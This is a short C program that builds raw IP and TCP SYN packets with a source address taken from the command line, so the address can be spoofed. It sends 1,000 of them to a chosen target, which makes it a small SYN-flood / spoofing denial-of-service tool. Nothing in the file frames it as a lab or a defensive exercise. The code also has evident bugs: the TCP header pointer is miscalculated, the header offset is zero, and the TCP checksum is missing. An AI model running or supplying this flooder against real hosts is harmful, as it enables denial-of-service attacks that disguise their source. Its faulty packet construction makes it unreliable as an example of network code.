#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>	
#include<netinet/in.h>	
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include<unistd.h>
#include<string.h>
#include<arpa/inet.h>

#define SRC_PORT 7777
#define DST_PORT 8888	

unsigned short csum (unsigned short *buf, int nwords);

int main (int argc, char* argv[]){
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);	
	char datagram[4096];	
	struct ip *iph = (struct ip *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) datagram + sizeof (struct ip);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(DST_PORT);
	sin.sin_addr.s_addr = inet_addr (argv[2]);

	memset (datagram, 0, 4096);	
	//fill ip header
	iph->ip_hl = 5;
	iph->ip_v = 4;
	iph->ip_tos = 0;
	iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);	
	iph->ip_id = htonl (6666);	
	iph->ip_off = 0;
	iph->ip_ttl = 255;
	iph->ip_p = 6;
	iph->ip_sum = 0;		
	iph->ip_src.s_addr = inet_addr (argv[1]);
	iph->ip_dst.s_addr = sin.sin_addr.s_addr;
	//fill tcp header
	tcph->th_sport = htons(SRC_PORT);	
	tcph->th_dport = htons(DST_PORT);
	tcph->th_seq = random();
	tcph->th_ack = 0;
	tcph->th_x2 = 0;
	tcph->th_off = 0;		
	tcph->th_flags = TH_SYN;	
	tcph->th_win = htonl(65535);	
	tcph->th_sum = 0;
	tcph->th_urp = 0;

	iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);

	{				
		int one = 1;
		const int *val = &one;
		if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0){
			printf ("Warning: Cannot set HDRINCL!\n");
		}
	}

	for(int i=0; i<1000; i++){
		if (sendto(s, datagram, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
			printf ("error\n");
		}else{
			printf (".");
		}
	}
	printf("\n");
	return 0;
}

unsigned short csum (unsigned short *buf, int nwords){
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--){
		sum += *buf++;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}
